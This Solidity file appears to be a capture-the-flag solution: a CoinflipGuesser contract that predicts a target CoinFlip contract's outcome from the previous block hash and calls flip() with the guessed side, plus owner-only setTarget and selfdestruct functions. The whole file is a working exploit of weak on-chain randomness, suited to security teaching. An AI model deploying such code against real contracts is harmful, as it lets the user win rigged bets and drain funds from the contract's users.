pragma solidity ^0.4.18;

interface CoinFlip {
    function flip(bool) external returns (bool);
}

contract CoinflipGuesser {
    address public target;
    address public owner;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function CoinflipGuesser(address _target) public {
        target = _target;
        owner = msg.sender;
    }

    function hax() public returns(bool) {
        CoinFlip game = CoinFlip(target);
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        return game.flip(side);
    }

    function setTarget(address _target) public {
        require(msg.sender == owner);

        target = _target;
    }

    function kill() public {
        require(msg.sender == owner);

        selfdestruct(owner);
    }
}
